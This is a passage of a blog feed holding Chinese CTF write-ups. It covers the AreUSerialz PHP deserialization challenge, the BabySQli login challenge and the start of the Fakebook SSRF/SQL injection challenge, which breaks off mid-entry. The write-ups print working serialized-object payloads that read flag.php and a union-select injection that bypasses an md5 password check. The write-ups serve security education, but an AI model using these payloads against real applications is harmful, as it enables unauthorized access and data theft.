srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317220933322"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="2021/03/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"/>
      <url>2021/03/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h3><p><strong>如何bypass protected 和 private 属性</strong></p><blockquote><p>PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p><p>参考自：<a href="https://blog.csdn.net/Oavinci/article/details/106998738">https://blog.csdn.net/Oavinci/article/details/106998738</a></p></blockquote><p>0x02源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;  <span class="comment">//5该函数由op值决定调用 write 还是 read 函数，显然我们希望调用read()</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123; <span class="comment">//6弱相等</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename); <span class="comment">//7这个地方是回显点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="comment">//3反序列化后自动调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>) <span class="comment">//4强相等</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process(); <span class="comment">//5调用process函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123; <span class="comment">//1本函数限制了我们的payload只能在ascii码为32到125之间取</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>); <span class="comment">//2直接反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析完代码逻辑，就只有两个点了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op ===<span class="string">&quot;2&quot;</span>) 返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op ==<span class="string">&quot;2&quot;</span>) 返回<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>通过整数2即可让bypass</p><p>另一个点即前置知识中提到 bypass protected 属性</p><h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h3><ol><li><p>我们利用php7对属性不敏感来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$a</span>-&gt;op=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</p></blockquote></li><li><p>我们利用 s 改写成S 支持16进制来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//自己简单将输出手动修改为</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]BabySQli</title>
      <link href="2021/03/09/GXYCTF2019-BabySQli/"/>
      <url>2021/03/09/GXYCTF2019-BabySQli/</url>
      
        <content type="html"><![CDATA[<p>一种绕过登入验证password进行md5处理的方法</p><span id="more"></span><p>0x01 信息收集</p><p>一个朴实无华的登入框</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001134758.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001134758.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001134758"></p><p>那burp先简单fuzz下看过滤了什么</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001349785.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001349785.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001349785"></p><p>or多给了这个东西</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001431278.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001431278.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001431278"></p><p>base32编码 后base64 编码得到 一句经典的sql语句</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure></blockquote><p>字符型注入</p><h4 id="0x02构造exp"><a href="#0x02构造exp" class="headerlink" title="0x02构造exp"></a>0x02构造exp</h4><p>经过多次尝试发现 <code>or、=、()、order</code>被ban掉了，其他正常，不过回显只有 wrong user，wrong pass</p><p>好奇后端是怎么验证的？ 先验证 username 再验证password,再来看他的sql语句</p><blockquote><p>select * from user where username=’$name’</p></blockquote><p>相必先带入 username 执行sql语句 取出 数据</p><p>然后在将数据库中的passwd 与我们所传进行校验，其代码猜测为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pw</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result_array</span>=mysql_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result_array</span>[<span class="number">1</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;wrong user&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result_array</span>[<span class="number">2</span>]===md5(<span class="variable">$pw</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;wrong pass&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>于是绕过方式就比较简单了</p><blockquote><p>username:admi’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70 </p><p>password:123</p><p> md5(123)=’202cb962ac59075b964b07152d234b70’</p></blockquote><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210310210055728.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210310210055728.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210310210055728"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/"/>
      <url>2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/</url>
      
        <content type="html"><![CDATA[<p>ssrf和sql注入组合拳</p><span id="more"></span><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231135802.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231135802.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231135802"></p><p>简单注册一个测试账户，进入页面</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231257903.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231257903.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231257903"></p><p>发现此处，猜测可能存在sql注入漏洞</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231852788.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231852788.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231852788"></p><p>sqlmap 基本测试出no处存在sql注入漏洞，但是很遗憾并没有拿到数据，猜测一些关键字被过滤</p><p>访问一下robots.txt文件，有意外发现</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308232514380.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308232514380.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308232514380"></p><p>得到课user.php的源码备份文件</p><h3 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">//很明显这里存在SSRF漏洞</span></span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现给出的源码除了有SSRF漏洞之外并没有直接可控参入，于是这个题是一个灰盒测试题目</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233532327.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233532327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233532327"></p><p>此处应该调用 UserInfo类里的 getBlogContents函数</p><p>不妨再次对注入点进行测试</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233833628.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233833628.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233833628"></p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233952457.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233952457.png" 